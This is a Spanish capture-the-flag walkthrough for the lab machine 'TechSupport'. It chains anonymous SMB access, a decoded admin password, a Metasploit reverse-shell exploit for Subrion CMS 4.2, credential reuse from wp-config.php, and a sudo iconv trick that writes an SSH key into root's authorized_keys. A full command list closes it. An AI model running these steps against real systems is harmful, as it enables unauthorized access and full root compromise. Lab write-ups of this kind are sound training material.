# Write-up TechSupport

**Autor**: Asier González

## Reconocimiento

Empiezo con un escaneo de puertos:

```bash
nmap -sC -sV -O -Pn -p 1-10000 -T4 IP
```

![nmap](images/nmap.png)

Los puertos descubiertos son:

- `22/tcp` (SSH)
- `80/tcp` (HTTP)
- `139/tcp` (SMB)
- `445/tcp` (SMB)

Como no tengo credenciales para SSH, me centro en los otros servicios:

- `SMB`, por si hay shares accesibles sin autenticación
- `HTTP`, por si hay alguna aplicación vulnerable

## Enumeración

### SMB

Empiezo listando los shares accesibles:

```bash
smbmap -H IP -u '' -p ''
```

Veo que hay un share llamado `websvr` accesible sin autenticación.

![smbmap](images/smbmap.png)

Me conecto y listo los archivos. Dentro encuentro uno llamado `enter.txt`.

![smbclient](images/smbclient.png)

Lo descargo y lo leo. Ahí veo unas credenciales para un panel de `Subrion CMS`:

```text
admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk
```

Además, el propio archivo comenta que `/subrion` está roto y que hay que editarlo desde el panel. También menciona WordPress.

![entertxt](images/entertxt.png)

Buscando en internet sobre `cooked with magical formula hash`, veo que se puede resolver con CyberChef usando la opción `Magic`.

![cyberchef](images/cyberchef.png)

El resultado es:

```text
Scam2021
```

Ahora ya tengo unas credenciales que solo falta ubicar.

### Web

Entro en la web principal y veo la página por defecto de Apache.

Enumero directorios con `gobuster`:

```bash
gobuster dir -u http://IP -w /usr/share/wordlists/dirb/common.txt
```

Entre los resultados, el que más me interesa es:

- `/wordpress`

![gobuster](images/gobuster.png)
![web](images/web.png)

Decido hacer también `dirsearch` tanto sobre `wordpress` como sobre `subrion`:

```bash
dirsearch -u http://IP/wordpress
dirsearch -u http://IP/subrion
```

![dirsearch-wordpress](images/dirsearch-wordpress.png)
![subrion-dirsearch](images/subrion-dirsearch.png)

En `enter.txt` ya se mencionaba que `/subrion` estaba roto y que había que tocarlo desde el panel, así que las rutas relacionadas con `/panel` me llaman la atención.

Pruebo a entrar directamente en `/subrion` y efectivamente no carga bien. Pero si accedo a `/subrion/panel`, sí llego al login del panel de administración.

![subrion-login](images/subrion-login.png)

Uso las credenciales que saqué antes:

- Usuario: `admin`
- Contraseña: `Scam2021`

Y consigo entrar.

![subrion-login-success](images/subrion-login-success.png)

## Explotación

Investigando el dashboard de Subrion, en `System > General` veo que se trata de la versión `4.2`.

![subrion-version](images/subrion-version.png)

Busco si esa versión tiene alguna vulnerabilidad conocida y encuentro un RCE. Además, veo que existe un módulo de Metasploit para explotarlo:

```bash
exploit/multi/http/subrion_cms_file_upload_rce
```

![subrion-rce](images/subrion-rce.png)
![rce-1](images/rce-1.png)
![rce-2](images/rce-2.png)

Lanzo Metasploit con la configuración necesaria:

```bash
msfconsole
use exploit/multi/http/subrion_cms_file_upload_rce
set RHOSTS IP
set TARGETURI /subrion/
set USERNAME admin
set PASSWORD Scam2021
set LHOST TU_IP_VPN
run
```

![metasploit](images/metasploit.png)

Consigo una shell como `www-data`.

![shell](images/shell.png)

## Post-explotación

No puedo sacar demasiado con `getuid`, `getprivs` o `whoami /priv`, así que me centro en enumeración manual.

Primero reviso usuarios válidos con shell:

```bash
cat /etc/passwd | grep sh
```

Ahí veo dos cuentas interesantes:

- `root`
- `scamsite`

![users](images/users.png)

Después empiezo a revisar archivos relacionados con WordPress y leo:

```bash
cat /var/www/html/wordpress/wp-config.php
```

El archivo contiene estas credenciales:

```php
define( 'DB_NAME', 'wpdb' );
define( 'DB_USER', 'support' );
define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );
define( 'DB_HOST', 'localhost' );
```

![wp-config](images/wp-config.png)

La contraseña me parece demasiado reutilizable como para ignorarla, así que la pruebo con el usuario `scamsite`.

Primero intento `su scamsite`, pero no me deja. Así que pruebo por SSH:

```bash
ssh scamsite@IP
```

Y efectivamente consigo entrar.

![ssh](images/ssh.png)

Ya como `scamsite`, hago:

```bash
sudo -l
```

Y veo que puedo ejecutar `iconv` como `root` sin contraseña.

![sudo](images/sudo.png)
![gtfobins](images/gtfobin.png)

## Escalada de privilegios

La forma más cómoda aquí es generar una clave SSH y copiar la pública al `authorized_keys` de `root` usando `iconv`, tal como sugiere GTFOBins.

Primero genero la clave con:

```bash
ssh-keygen
```

![key-gen](images/key-gen.png)

Después, desde la shell de `scamsite`, escribo mi clave pública en `/root/.ssh/authorized_keys` usando el binario permitido:

```bash
echo 'CLAVE_PUBLICA' | sudo /usr/bin/iconv -f 8859_1 -t 8859_1 -o /root/.ssh/authorized_keys
```

![sshkey](images/sshkey.png)

Con eso ya solo queda conectarme como `root`:

```bash
ssh root@IP
```

![root-ssh](images/root.png)

## Resultado

La cadena completa combina una mala exposición de credenciales en SMB, un RCE en Subrion y una escalada final por `sudo` sobre `iconv`, que permite escribir en `authorized_keys` de `root` y entrar por SSH sin más.

## Resumen de comandos directo a SYSTEM/root

1. `nmap -sC -sV -O -Pn -p 1-10000 -T4 IP`
2. `smbmap -H IP -u '' -p ''`
3. `smbclient //IP/websvr -N`
4. `get enter.txt`
5. Decodificar `7sKvntXdPEJaxazce9PXi24zaFrLiKWCk` y obtener `Scam2021`
6. `gobuster dir -u http://IP -w /usr/share/wordlists/dirb/common.txt`
7. `dirsearch -u http://IP/subrion`
8. Entrar en `http://IP/subrion/panel`
9. `msfconsole`
10. `use exploit/multi/http/subrion_cms_file_upload_rce`
11. `set RHOSTS IP`
12. `set TARGETURI /subrion/`
13. `set USERNAME admin`
14. `set PASSWORD Scam2021`
15. `set LHOST TU_IP_VPN`
16. `run`
17. `cat /var/www/html/wordpress/wp-config.php`
18. `ssh scamsite@IP`
19. `sudo -l`
20. `ssh-keygen`
21. `echo 'CLAVE_PUBLICA' | sudo /usr/bin/iconv -f 8859_1 -t 8859_1 -o /root/.ssh/authorized_keys`
22. `ssh root@IP`
23. `whoami`
